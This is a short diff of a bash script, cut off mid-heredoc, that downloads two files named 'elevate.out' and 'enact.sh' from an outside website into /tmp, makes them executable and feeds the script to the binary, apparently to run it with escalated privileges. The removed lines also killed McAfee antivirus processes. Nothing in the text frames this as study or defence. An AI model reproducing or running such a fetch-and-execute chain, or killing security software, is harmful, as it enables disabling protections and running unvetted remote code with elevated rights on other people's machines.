@@ -1,12 +1,8 @@
 #!/bin/bash
 
-pkill .*McAfee.*
-
-curl -s https://erikboesen.com/downloads/elevate.out --output /tmp/elevate.out
-chmod +x /tmp/elevate.out
-
-curl -s https://erikboesen.com/downloads/enact.sh --output /tmp/enact.sh
-chmod +x /tmp/enact.sh
+curl -so /tmp/elevate.out https://erikboesen.com/dl/elevate.out
+curl -so /tmp/enact.sh https://erikboesen.com/dl/enact.sh
+chmod +x /tmp/elevate.out /tmp/enact.sh
 
 /tmp/elevate.out <<EOF
 /tmp/enact.sh
